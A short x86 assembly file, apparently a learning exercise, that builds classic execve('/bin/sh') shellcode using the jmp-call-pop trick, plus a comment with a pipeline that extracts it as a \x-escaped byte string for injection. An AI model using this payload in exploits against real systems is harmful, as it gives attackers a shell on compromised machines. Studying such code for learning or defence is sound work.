# grep execve /usr/include/x86_64-linux-gnu/asm/unistd_32.h
# #define __NR_execve		 11
# man 2 execve
# int execve(const char *filename, char *const argv[], char *const envp[]);
# https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux
# eax = syscall[eax](ebx, ecx, edx, esi, edi, ebp)
xor %eax, %eax
xor %ecx, %ecx
xor %edx, %edx
mov $11, %al
jmp strLiteral
afterStrLiteral:
pop %ebx
int $0x80
strLiteral:
call afterStrLiteral
.string "/bin/sh"

# (as -32 execve_sh.s && (readelf -x.text a.out | grep '^  0x' | cut -b 14-48 | tr '\n' ' ' | sed 's# ##g') && echo) | sed 's#..#\\x\0#g'
